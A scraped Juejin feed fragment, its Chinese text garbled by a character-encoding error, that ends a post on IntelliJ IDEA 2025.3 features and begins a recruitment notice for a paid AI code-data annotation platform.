<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f258e76adf6644729985d0931588cd7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=3CPBkN3ekuZPfMG0AYBsxzz28lE%3D" alt="å¿«é€Ÿç”Ÿæˆä»£ç " loading="lazy"/></p>
<p>æ­¤å¤–ï¼ŒIDEA 2025.3 è¿˜å¢å¼ºäº†å¯¹ Spring Data repositories çš„ AOTï¼ˆAhead-of-Timeï¼‰ç¼–è¯‘æ”¯æŒã€‚å®ƒèƒ½æ£€æµ‹ç”Ÿæˆçš„ Spring Data repository å®ç°ï¼Œå¹¶åœ¨ä»£ç ä¸­ç›´æ¥æ˜¾ç¤ºæŸ¥è¯¢ã€‚ä½ å¯ä»¥å¯¼èˆªåˆ°æŸ¥è¯¢æ‰§è¡Œä»£ç è®¾ç½®æ–­ç‚¹å¹¶è·Ÿè¸ªæµç¨‹ï¼Œè¿˜å¯ä»¥åœ¨ä¸è¿è¡Œåº”ç”¨çš„æƒ…å†µä¸‹ç›´æ¥åœ¨ IDE ä¸­æ‰§è¡Œç”Ÿæˆçš„æŸ¥è¯¢ã€‚</p>
<h4 data-id="heading-11">Spring Debugger æ›´æ–°</h4>
<p>Spring Debugger æ’ä»¶ç°åœ¨å·²ç»æœ‰è¶…è¿‡ 25 ä¸‡ç”¨æˆ·äº†ã€‚è¿™æ¬¡æ›´æ–°å¸¦æ¥äº† 2 ä¸ªå‘¼å£°å¾ˆé«˜çš„åŠŸèƒ½ï¼š</p>
<ul>
<li>è¿œç¨‹åº”ç”¨è°ƒè¯•ï¼šåªéœ€å¯åŠ¨åº”ç”¨æ—¶æ‰“å¼€è°ƒè¯•ç«¯å£ï¼Œç„¶åä» IDE è¿æ¥å°±å¯ä»¥äº†</li>
<li>è‡ªåŠ¨æ•°æ®åº“è¿æ¥ï¼šåº”ç”¨å¯åŠ¨æ—¶ï¼ŒIDEA å¯ä»¥è‡ªåŠ¨è¿æ¥åˆ°ä½ çš„æ•°æ®åº“</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c853cc892cf4aad8cd35bf30f5a377b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=k3wbfoe6BVUPanlARbAV1ycCeYU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">Kubernetes ä½“éªŒæ”¹è¿›</h4>
<p>éƒ¨ç½²æ•°æ®åº“å’ŒæœåŠ¡å˜å¾—æ›´å®¹æ˜“äº†ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ç¼–è¾‘å™¨ä¸­ç¼–å†™ã€åº”ç”¨å’Œç®¡ç†ä¸€åˆ‡ã€‚</p>
<p>é¡¶éƒ¨æœ‰é›†ç¾¤å’Œå‘½åç©ºé—´é€‰æ‹©å™¨è®©ä½ ä¿æŒä¸Šä¸‹æ–‡ï¼Œå®æ—¶èµ„æºçŠ¶æ€å›¾æ ‡è®©ä½ å¿«é€Ÿå‘ç°é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c162bed2b31049f98f2b7bc0c196b104~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=K%2BN%2B9WSs4CnHR4wZIPW%2Blw8qOZI%3D" alt="" loading="lazy"/></p>
<p>é‡åˆ°ç¼ºå¤±çš„ç¯å¢ƒå˜é‡æˆ–å¤±è´¥çš„ pods æ—¶ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸€é”®æ—¥å¿—å³æ—¶ä¿®å¤å¹¶é‡æ–°éƒ¨ç½²ï¼Œæ— éœ€ç¦»å¼€ä½ çš„ manifestã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95f6b1c801bc49cbb6b9f3eaa0901526~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=NZWtEXv7tq%2BucP37gUNdWmO%2FAOA%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥ä½¿ç”¨ç¼–è¾‘å™¨å†…çš„ secret ç®¡ç†ä¿æŠ¤æœåŠ¡è®¾ç½®ï¼Œç›´æ¥ä» YAML æŸ¥çœ‹å’Œå¤åˆ¶æ•°æ®åº“å‡­æ®ã€‚</p>
<p>éœ€è¦è¿æ¥èµ„æºæ—¶ï¼Œä½¿ç”¨ä¸€é”®ç«¯å£è½¬å‘æ¥è½¬å‘å®¹å™¨ç«¯å£ã€è‡ªåŠ¨åŠ è½½ secretsï¼Œå¹¶åœ¨å‡ ç§’é’Ÿå†…è®¾ç½®åˆ°æ•°æ®åº“æˆ–æœåŠ¡çš„å³æ—¶è¿æ¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f95746e35adb405f87e927c1a4fc9acc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=MRm%2BwGA0MTVOimTMe3UxipDU9hc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">æœ€å</h2>
<p>æˆ‘è§‰å¾— JetBrains è¿™æ­¥æ£‹ä¸‹å¾—æŒºæ¼‚äº®çš„ï¼Œæ—¢ç…§é¡¾äº†å…è´¹ç”¨æˆ·ï¼Œåˆä¿æŒäº†å•†ä¸šæ¨¡å¼çš„å¯æŒç»­æ€§ã€‚è¯´ä¸å®šè¿˜èƒ½å¸å¼•æ›´å¤šå¼€å‘è€…è¿›å…¥ä»–ä»¬çš„ç”Ÿæ€ï¼Œæœ€ç»ˆè½¬åŒ–ä¸ºä»˜è´¹ç”¨æˆ·ã€‚</p>
<p>è‚¯å®šä¹Ÿä¼šæœ‰åŒå­¦è¯´ï¼Œä¸ºä»€ä¹ˆ IDEA ä¸èƒ½å®Œå…¨å…è´¹ï¼Ÿ</p>
<p>æ¯•ç«Ÿäººå®¶æ˜¯ä¸€ä¸ªå…¬å¸å‘€ï¼åœ¨æˆ‘çœ‹æ¥ï¼ŒJetBrains å·²ç»å¾ˆæœ‰è¯šæ„äº†ï¼Œä¹‹å‰ä¹Ÿé™†ç»­å¼€æ”¾äº† WebStorm ç­‰äº§å“çš„å…è´¹ç‰ˆï¼Œè€Œä¸”è¿˜æŒç»­ç»´æŠ¤å¼€æºç‰ˆæœ¬ã€‚</p>
<p>æ²¡é”™ï¼ŒIDEA æ˜¯æœ‰å¼€æºç‰ˆçš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52c492b2ed5a43b88dcb7c97769c3f21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=Lvaddg5mwP6FOB68OxGvzM5sVsU%3D" alt="" loading="lazy"/></p>
<p>é¡ºä¾¿è¯´ä¸€å¥ï¼Œå¦‚æœä½ æ˜¯æ•™è‚²å·¥ä½œè€…æˆ–è€…å­¦ç”Ÿï¼Œå¯ä»¥é€šè¿‡ JetBrains å®˜æ–¹çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jetbrains.com.cn%2Fshop%2Feform%2Fstudents" target="_blank" title="https://www.jetbrains.com.cn/shop/eform/students" ref="nofollow noopener noreferrer">æ•™è‚²è®¸å¯è¯ç”³è¯·é¡µé¢</a> å…è´¹ç”³è¯· Ultimate è®¢é˜…ï¼Œç•…äº«æ‰€æœ‰é«˜çº§åŠŸèƒ½ã€‚</p>
<blockquote>
<p>ç”³è¯·åœ°å€ï¼š</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd9cf0ccfcea4ad1bc09a2eebd1ea0bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765965868&amp;x-signature=eDCz%2FEwKkOIn29FWg6DSwzivN80%3D" alt="" loading="lazy"/></p>
<p>å»ºè®®å¤§å®¶å°½å¿«æ›´æ–°ä½“éªŒä¸€ä¸‹ï¼Œåæ­£æˆ‘å·²ç»ç”¨ä¸Šäº†å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼</p>
<h2 data-id="heading-14">æ›´å¤š</h2>
<p>ğŸ’» ç¼–ç¨‹å­¦ä¹ äº¤æµï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fcode-nav" target="_blank" title="https://github.com/liyupi/code-nav" ref="nofollow noopener noreferrer">ç¼–ç¨‹å¯¼èˆª</a> ğŸ“ƒ ç®€å†å¿«é€Ÿåˆ¶ä½œï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Flaoyujianli" target="_blank" title="https://github.com/liyupi/laoyujianli" ref="nofollow noopener noreferrer">è€é±¼ç®€å†</a> âœï¸ é¢è¯•åˆ·é¢˜ç¥å™¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliyupi%2Fmianshiya" target="_blank" title="https://github.com/liyupi/mianshiya" ref="nofollow noopener noreferrer">é¢è¯•é¸­</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ•°æ®æ ‡æ³¨å¹³å°é‡ç£…ä¸Šçº¿ | æ ‡æ³¨èµšç°é‡‘ ä½é—¨æ§›çœŸæ”¶ç›Š]]></title>    <link>https://juejin.cn/post/7581807793134108718</link>    <guid>https://juejin.cn/post/7581807793134108718</guid>    <pubDate>2025-12-10T06:19:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581807793134108718" data-draft-id="7581667332306305062" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ•°æ®æ ‡æ³¨å¹³å°é‡ç£…ä¸Šçº¿ | æ ‡æ³¨èµšç°é‡‘ ä½é—¨æ§›çœŸæ”¶ç›Š"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-10T06:19:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘é…±"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194374926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ•°æ®æ ‡æ³¨å¹³å°é‡ç£…ä¸Šçº¿ | æ ‡æ³¨èµšç°é‡‘ ä½é—¨æ§›çœŸæ”¶ç›Š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1556564194374926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘é…±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T06:19:34.000Z" title="Wed Dec 10 2025 06:19:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    487
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d659d7ae4c1b48d09248cda3382116fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046452&amp;x-signature=HD%2BuCZ%2Fe29fUbZMA7nLY4keWveY%3D" alt="68f71ddf171f8850e881f947f1cfb861.png" loading="lazy"/></p>
<ul>
<li>ä½ æ˜¯å¦æƒ³äº²èº«ä½“éªŒæœ€å‰æ²¿çš„ AI æ•°æ®å·¥ä½œï¼Œå´æ‰¾ä¸åˆ°ä¸“ä¸šçš„å‚ä¸è·¯å¾„ï¼Ÿ</li>
<li>ä½ æ˜¯å¦å¸Œæœ›è®©ç²¾é€šçš„ç¼–ç¨‹æŠ€èƒ½ï¼Œåœ¨ä¸šä½™æ—¶é—´åˆ›é€ å®å®åœ¨åœ¨çš„ä»·å€¼ï¼Ÿ</li>
</ul>
<p>ä¸€ä¸ªå¤šé¢†åŸŸçš„<strong>æ•°æ®é‡‡é›†ä¸æ ‡æ³¨æœåŠ¡å¹³å°</strong>ï¼Œä¸ºä½ è€Œæ¥ï¼</p>
<p><strong>ä½é—¨æ§›ã€çœŸæ”¶ç›Šï¼</strong> åˆ©ç”¨ç¢ç‰‡æ—¶é—´ï¼Œå°†ä½ çš„ä»£ç æ´å¯ŸåŠ›ç›´æ¥<strong>å˜ç°</strong>ã€‚</p>
<p>è¿™ä¸ä»…ä»…æ˜¯ä¸€ä¸ªä»»åŠ¡å¹³å°ï¼Œæ›´æ˜¯ä¸€ä¸ªä¸“ä¸º<strong>èµ„æ·±å¼€å‘è€…</strong>æ‰“é€ çš„ã€ç”¨<strong>æŠ€æœ¯æ¢å–å›æŠ¥</strong>çš„é«˜ä»·å€¼ç¤¾åŒºã€‚</p>
<h2 data-id="heading-0">ğŸ“’ æ‹›å‹Ÿä»‹ç»</h2>
<h3 data-id="heading-1">æˆ‘ä»¬æ˜¯è°</h3>
<p><strong>AIDPï¼ˆAI Data Platformï¼‰</strong> æä¾›å®Œæ•´çš„ AI æ•°æ®è§£å†³æ–¹æ¡ˆï¼Œæ¶µç›–ï¼š</p>
<ul>
<li>æ•°æ®é‡‡é›†</li>
<li>æ•°æ®æ ‡æ³¨</li>
<li>æ•°æ®åˆæˆ</li>
<li>å¤šç§æ•°æ®ç”Ÿäº§èƒ½åŠ›</li>
</ul>
<h3 data-id="heading-2">éœ€è¦ä½ åšä»€ä¹ˆ</h3>
<p>å‚ä¸åè®­ç»ƒé«˜è´¨é‡ä»£ç æ•°æ®ç”Ÿäº§ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š</p>

























<table><thead><tr><th>ä»»åŠ¡ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>å¼ºåŒ–å­¦ä¹ æ•°æ®ç”Ÿäº§</td><td>ä¸º RLHF è®­ç»ƒæä¾›é«˜è´¨é‡åé¦ˆæ•°æ®</td></tr><tr><td>ç›‘ç£å¾®è°ƒï¼ˆSFTï¼‰</td><td>ç”Ÿäº§æŒ‡ä»¤-å“åº”å¯¹æ•°æ®</td></tr><tr><td>å¥–åŠ±æ¨¡å‹ï¼ˆRMï¼‰</td><td>å¯¹æ¨¡å‹è¾“å‡ºè¿›è¡Œåå¥½æ’åºå’Œè¯„åˆ†</td></tr><tr><td>æ•°æ®è´¨æ£€</td><td>å®¡æ ¸å’Œä¼˜åŒ–å·²æœ‰æ•°æ®è´¨é‡</td></tr></tbody></table>
<h3 data-id="heading-3">ä½ å°†è·å¾—çš„å›æŠ¥</h3>
<ul>
<li>ğŸ’°ç°é‡‘æ”¶ç›Šï¼šæ·±åº¦å‚ä¸æ•°æ®æ ‡æ³¨çš„ä»£ç ä¸“å®¶ï¼Œæœˆå‡è·å– <strong>Â¥10000+</strong> ä»¥ä¸Šå›æŠ¥</li>
</ul>
<blockquote>
<ul>
<li>æ—¶è–ªèŒƒå›´ï¼š<strong>50 - 1000</strong> å…ƒï¼Œå…·ä½“ä»¥é¡¹ç›®æœ€ç»ˆå®šä»·ä¸ºå‡†ï¼Œå¤šåŠ³å¤šå¾—ï¼Œä»»åŠ¡æ˜ç æ ‡ä»·ï¼›</li>
<li>è®¡ç¨æ–¹å¼ï¼šåŠ³åŠ¡ç‹¬ç«‹è®¡ç¨ï¼Œæ”¶ç›Šæ¸…æ™°é€æ˜ã€‚</li>
</ul>
</blockquote>
<ul>
<li>å‚ä¸æ™ºèƒ½ Agent è°ƒä¼˜ï¼ŒæŒæ¡å‰æ²¿æŠ€æœ¯åŠ¨æ€</li>
</ul>
<h3 data-id="heading-4">éœ€è¦å…·å¤‡çš„æ¡ä»¶</h3>
<ul>
<li><strong>å¯¹ AI æœ‰çƒ­æƒ…ï¼Œæ—¥å¸¸é«˜é¢‘ä½¿ç”¨ AI Coding å·¥å…·</strong></li>
<li><strong>å…·å¤‡æ‰å®çš„ç¼–ç¨‹åŸºç¡€å’Œä»£ç ç†è§£èƒ½åŠ›</strong></li>
</ul>
<blockquote>
<p><strong>åŠ åˆ†é¡¹</strong></p>
<ul>
<li>LeetCode Hard é¢˜ç›®é«˜é€šè¿‡ç‡</li>
<li>GitHub é«˜æ˜Ÿä»“åº“è´¡çŒ®è€…</li>
<li>å¼€æºç¤¾åŒºæ´»è·ƒæˆå‘˜</li>
</ul>
</blockquote>
<p>åŒæ—¶æ¬¢è¿ï¼šPMã€QA åŒå­¦å‚ä¸ï¼Œå¹³å°åŒæ—¶æä¾›éæŠ€æœ¯ç±»é¢˜ç›®</p>
<h2 data-id="heading-5">ğŸ‘€ æˆ‘ä»¬çš„ç›®æ ‡ç”¨æˆ·</h2>
<p>æˆ‘ä»¬åœ¨å¯»æ‰¾è¿™æ ·çš„ä½ ï¼š</p>
<ul>
<li><strong>æŠ€æœ¯æ ˆ</strong>ï¼šç†Ÿæ‚‰å¤§å‰ç«¯ã€Pythonã€Javaã€C++ã€Go ç­‰ä¸»æµç¼–ç¨‹è¯­è¨€</li>
<li><strong>è´¨é‡æ„è¯†</strong>ï¼šç†Ÿæ‚‰æµ‹è¯•ä¸è´¨é‡ä¿éšœæµç¨‹</li>
<li><strong>æ¢ç´¢ç²¾ç¥</strong>ï¼šå¯¹å‰æ²¿æŠ€æœ¯æœ‰è‡ªå·±çš„ç†è§£ï¼Œä¹äºæ¢ç´¢æ–°çŸ¥è¯†</li>
<li><strong>ç¤¾åŒºå‚ä¸</strong>ï¼šæœ‰å¼€æºè´¡çŒ®ã€LeetCode æ´»è·ƒç»å†è€…ä¼˜å…ˆ</li>
</ul>
<h2 data-id="heading-6">ğŸš€ä½ çš„ä¸“å®¶ä»»åŠ¡</h2>
<h3 data-id="heading-7">æ ‡æ³¨å®éªŒ</h3>
<blockquote>
<p>å¯¹ä»£ç ç‰‡æ®µã€æ—¥å¿—ã€æŠ€æœ¯æ–‡æ¡£ç­‰è¿›è¡Œç²¾å‡†æ ‡æ³¨</p>
</blockquote>
<p><strong>å…·ä½“èŒè´£</strong></p>
<ul>
<li>æŒ‰ç…§é¡¹ç›®åˆ¶å®šçš„æ ‡æ³¨è§„èŒƒï¼Œå¯¹æŒ‡å®šæ•°æ®ï¼ˆæ–‡æœ¬ã€ä»£ç ç‰‡æ®µã€æ—¥å¿—ã€æŠ€æœ¯æ–‡æ¡£ç­‰ï¼‰è¿›è¡Œå‡†ç¡®æ ‡æ³¨</li>
<li>è¯†åˆ«å¹¶ä¿®æ­£æ•°æ®ä¸­å­˜åœ¨çš„æ­§ä¹‰ã€é”™è¯¯æˆ–ä¸ä¸€è‡´ä¹‹å¤„</li>
<li>å¯¹å¤æ‚æ ·æœ¬ç»™å‡ºä¸“ä¸šåˆ¤æ–­ï¼Œç¡®ä¿æ ‡æ³¨ç»“æœçš„å‡†ç¡®æ€§ä¸ä¸€è‡´æ€§</li>
</ul>
<h3 data-id="heading-8">è´¨é‡æŠŠæ§</h3>
<blockquote>
<p>äº’å®¡ä»–äººæˆæœï¼Œä¿éšœæ•°æ®çº¯åº¦</p>
</blockquote>
<p><strong>å…·ä½“èŒè´£</strong></p>
<ul>
<li>å‚ä¸æ ‡æ³¨æ ‡å‡†çš„åˆ¶å®šä¸å®Œå–„ï¼Œæå‡ºæ”¹è¿›æ„è§</li>
<li>æ‰§è¡Œä¸“å®¶äº’å®¡æœºåˆ¶ï¼Œå¯¹å…¶ä»–æ ‡æ³¨ç»“æœè¿›è¡Œå®¡æ ¸å’Œåé¦ˆ</li>
<li>ç»“åˆå®é™…ç»éªŒï¼Œå¯¹æ ‡æ³¨æ ·æœ¬çš„åˆç†æ€§å’Œä¸šåŠ¡é€‚é…åº¦è¿›è¡Œè¯„ä¼°</li>
</ul>
<h3 data-id="heading-9">çŸ¥è¯†è´¡çŒ®</h3>
<blockquote>
<p>æ²‰æ·€æœ€ä½³å®è·µï¼Œæ‰“é€ å¯å¤ç”¨çš„çŸ¥è¯†å®åº“</p>
</blockquote>
<p><strong>å…·ä½“èŒè´£</strong></p>
<ul>
<li>å°†ä¸ªäººä¸“ä¸šçŸ¥è¯†è½¬åŒ–ä¸ºæ ‡æ³¨è§„èŒƒã€æœ€ä½³å®è·µæˆ–æ¡ˆä¾‹ï¼Œä¾›å›¢é˜Ÿå‚è€ƒ</li>
<li>åœ¨é‡åˆ°ç–‘éš¾é—®é¢˜æ—¶ï¼Œä½œä¸ºä¸“å®¶æä¾›åˆ¤å®šä¾æ®ï¼Œå½¢æˆå¯å¤ç”¨çš„çŸ¥è¯†åº“</li>
<li>ååŠ©é¡¹ç›®ç»„ä¼˜åŒ–ä»»åŠ¡åˆ†é…ã€è´¨é‡ç›‘æ§å’Œæµç¨‹è®¾è®¡</li>
</ul>
<h2 data-id="heading-10">â˜ï¸ ç¤¾ç¾¤äº¤æµ</h2>
<p>å‚åŠ æ´»åŠ¨çš„æ˜å‹ä¸€å®šè¦å…¥ç¾¤ï¼š</p>
<ul>
<li>é‡è¦æ¶ˆæ¯ä¸é”™è¿‡</li>
<li>å¤§å®¶äº’ç›¸é¼“åŠ±</li>
<li>æœ‰é—®é¢˜å¯ä»¥åœ¨ç¾¤å†…å’¨è¯¢</li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b9ae96e990d47e98940cc4b976a4053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766046452&amp;x-signature=3LrSMBOkEm9qzQq1brVcbjlt4pY%3D" alt="134067c882fcc733a803fb9c71f0d2a6.png" loading="lazy"/></p>
<h2 data-id="heading-11">â‰ï¸ å¸¸è§é—®é¢˜ FAQ</h2>
<p><strong>Q1ï¼šæ²¡æœ‰æ ‡æ³¨ç»éªŒå¯ä»¥å‚ä¸å—ï¼Ÿ</strong></p>
<p>æˆ‘ä»¬éœ€è¦ä½ å…·å¤‡æ‰å®çš„ç¼–ç¨‹åŸºç¡€å³å¯å¿«é€Ÿä¸Šæ‰‹ï¼Œæ‰€ä»¥éœ€è¦ä½ æœ‰ä¸€å®šçš„<em>ç¼–ç¨‹ç»éªŒ</em>ã€‚</p>
<p><strong>Q2: æ¯å¤©éœ€è¦æŠ•å…¥å¤šå°‘æ—¶é—´ï¼Ÿ</strong></p>
<p>å®Œå…¨çµæ´»ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„æ—¶é—´å®‰æ’å‚ä¸ï¼Œå……åˆ†åˆ©ç”¨ç¢ç‰‡æ—¶é—´ã€‚</p>
